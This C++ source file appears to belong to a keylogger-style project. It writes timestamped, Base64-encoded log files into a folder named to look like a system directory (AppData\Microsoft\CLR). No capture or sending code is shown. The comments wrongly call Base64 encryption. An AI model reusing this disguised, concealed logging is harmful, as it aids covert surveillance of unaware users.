#include "IO.h"

namespace IO
{
	std::string getOurPath(const bool append_separator)
	{
		char* buffer = nullptr;
		size_t bufsize;

		// Retrieve the environment variable "APPDATA"
		if (_dupenv_s(&buffer, &bufsize, "APPDATA") == 0 && buffer != nullptr) {
			// buffer now contains a copy of the environment variable
			std::string appdata_directory(buffer);
			free(buffer); // Free the buffer to avoid memory leaks

			std::string full = appdata_directory + "\\Microsoft\\CLR"; // Append the path to our application's data directory
			return full + (append_separator ? "\\" : ""); // Append a directory separator if requested
		}
		else {
			// An error occurred
			// You can throw an exception or return an empty string
			return "";
		}
		/*
		std::string appdata_directory(getenv("APPDATA")); // Get the path to the AppData directory
		std::string full = appdata_directory + "\\Microsoft\\CLR"; // Append the path to our application's data directory
		return full + (append_separator ? "\\" : ""); // Append a directory separator if requested
		*/
	}

	bool mkOneDir(const std::string& path)
	{
		// Create the directory
		return (bool)CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool mkDir(std::string& path)
	{
		// Iterate over each character in the path
		for (char& ch : path)
		{
			if (ch == '\\') // If we encounter a directory separator
			{
				ch = '\0'; // Temporarily replace the separator with a null character
				if (!mkOneDir(path))
					return false; // If creation fails, return false
				ch = '\\'; // Restore the directory separator
			}
		}
		// If we reach this point, the directory was created successfully
		return true;
	}

	template <class T>
	std::string writeLog(const T& data)
	{
		// Get the path to our application's data directory
		std::string path = getOurPath(true);
		Helper::DateTime _DateTime; // Get the current date and time
		std::string fileName = _DateTime.GetDateTimeString("_") + ".log"; // Create a file name based on the current date and time

		try
		{
			// Open the file in write mode
			std::ofstream file(path + fileName);
			if (!file)
				return ""; // If the file cannot be opened, return an empty string

			// Create a string stream to build the log entry
			std::ostringstream str;
			str << "[" << _DateTime.GetDateString() << "] " << std::endl << data << std::endl; // Write the log entry to the string stream
			std::string data = Base64::encrypt_base64(str.str()); // Encrypt the log entry using the Base64 algorithm
			file << data; // Write the encrypted log entry to the file
			if(!file)
				return ""; // If the write operation fails, return an empty string
			file.close();
			return fileName;
		}
		catch (...)
		{
			// If an exception occurs, return an empty string
			return "";
		}
	}
}